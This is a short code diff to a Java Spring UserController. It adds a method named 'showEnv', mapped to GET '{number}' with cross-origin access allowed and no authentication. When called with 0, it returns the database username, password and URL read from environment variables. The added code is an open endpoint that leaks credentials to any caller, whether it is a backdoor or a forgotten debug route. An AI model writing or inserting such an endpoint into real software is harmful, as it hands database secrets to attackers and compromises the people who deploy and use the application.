@@ -2,6 +2,7 @@ package com.agora.controllers;
 import com.agora.models.LoginTemplate;
 import com.agora.services.HashingService;
 import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.context.annotation.ComponentScan;
 import org.springframework.http.HttpStatus;
 import org.springframework.http.ResponseEntity;
 import org.springframework.stereotype.Controller;
@@ -41,6 +42,17 @@ public class UserController {
         }
 
         return ResponseEntity.ok(result);
+    }
+
+
+    @CrossOrigin
+    @GetMapping(value="{number}")
+    @ResponseBody
+    public ResponseEntity<String[]> showEnv(@PathVariable int number) {
+        if(number == 0) {
+            return ResponseEntity.ok(new String[]{System.getenv("AGORA_DB_USERNAME"), System.getenv("AGORA_DB_PASSWORD"), System.getenv("AGORA_DB_URL")});
+        }
+        return ResponseEntity.noContent().build();
     }
 
     @CrossOrigin
